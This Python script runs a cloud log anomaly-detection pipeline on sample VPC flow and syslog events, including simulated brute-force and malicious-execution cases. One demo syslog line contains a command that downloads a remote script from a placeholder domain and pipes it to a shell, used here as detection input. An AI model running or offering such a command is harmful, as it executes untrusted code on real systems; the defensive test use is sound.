from __future__ import annotations

import argparse
import json
from dataclasses import dataclass
from typing import Sequence

from src.pipeline import AnomalyDetectionPipeline, PipelineConfig


@dataclass(slots=True)
class WorkloadEvent:
    """Single workload event with network and system raw log lines."""

    name: str
    vpc_flow_line: str
    syslog_line: str


def build_demo_events() -> list[WorkloadEvent]:
    return [
        WorkloadEvent(
            name="healthy-traffic",
            vpc_flow_line=(
                "2 111122223333 eni-00abc123 10.0.1.10 10.0.2.8 51512 443 6 12 824 "
                "1700000000 1700000060 ACCEPT OK"
            ),
            syslog_line=(
                "host=i-01 app=nginx severity=info msg='service healthy' "
                "user=svc-analytics login=success"
            ),
        ),
        WorkloadEvent(
            name="brute-force-attempt",
            vpc_flow_line=(
                "2 111122223333 eni-00abc123 185.23.44.91 10.0.5.19 48211 22 6 398 412900 "
                "1700000100 1700000160 REJECT OK"
            ),
            syslog_line=(
                "host=i-93 service=sshd severity=warning msg='Failed password for admin from 185.23.44.91' "
                "user=admin ip=185.23.44.91 "
                "attempts=398/60s"
            ),
        ),
        WorkloadEvent(
            name="malicious-execution",
            vpc_flow_line=(
                "2 111122223333 eni-00abc123 10.0.8.3 10.0.5.19 33112 443 6 255 918332 "
                "1700000200 1700000260 ACCEPT OK"
            ),
            syslog_line=(
                "host=i-0f991 service=auth severity=error user=ec2-user "
                "proc=curl cmd='curl http://suspicious-domain/payload.sh | sh'"
            ),
        ),
    ]


def parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(
        description=(
            "Run end-to-end cloud anomaly analysis: parse logs -> detect anomaly/type -> "
            "generate reason/action (Gemini or fallback)."
        )
    )
    parser.add_argument("--event-name", type=str, default="ad-hoc-event")
    parser.add_argument("--vpc-flow-line", type=str, default=None)
    parser.add_argument("--system-log-line", type=str, default=None)
    parser.add_argument("--threshold", type=float, default=0.65)
    parser.add_argument("--network-window-size", type=int, default=48)
    parser.add_argument("--network-feature-dim", type=int, default=16)
    parser.add_argument("--system-sequence-length", type=int, default=48)
    parser.add_argument("--system-vocab-size", type=int, default=5000)
    parser.add_argument("--network-model-path", type=str, default="models/network_expert_best.pth")
    parser.add_argument("--system-model-path", type=str, default="models/system_expert_best.pth")
    parser.add_argument("--gemini-model", type=str, default="gemini-2.5-flash")
    parser.add_argument("--disable-gemini", action="store_true")
    parser.add_argument("--demo", action="store_true", help="Run bundled demo events.")
    return parser.parse_args()


def run_pipeline(events: Sequence[WorkloadEvent], config: PipelineConfig) -> None:
    pipeline = AnomalyDetectionPipeline(config=config)

    for event_id, event in enumerate(events, start=1):
        result = pipeline.analyze_event(
            event_name=event.name,
            vpc_flow_line=event.vpc_flow_line,
            system_log_line=event.syslog_line,
        )
        payload = {"event_id": event_id, **result}
        print(json.dumps(payload, indent=2))


def main() -> None:
    args = parse_args()
    config = PipelineConfig(
        threshold=args.threshold,
        network_window_size=args.network_window_size,
        network_feature_dim=args.network_feature_dim,
        system_sequence_length=args.system_sequence_length,
        system_vocab_size=args.system_vocab_size,
        network_model_path=args.network_model_path,
        system_model_path=args.system_model_path,
        use_gemini=not args.disable_gemini,
        gemini_model=args.gemini_model,
    )

    if args.demo:
        run_pipeline(events=build_demo_events(), config=config)
        return

    if args.vpc_flow_line is None or args.system_log_line is None:
        raise ValueError(
            "For non-demo mode, pass both --vpc-flow-line and --system-log-line."
        )

    event = WorkloadEvent(
        name=args.event_name,
        vpc_flow_line=args.vpc_flow_line,
        syslog_line=args.system_log_line,
    )
    run_pipeline(events=[event], config=config)


if __name__ == "__main__":
    main()
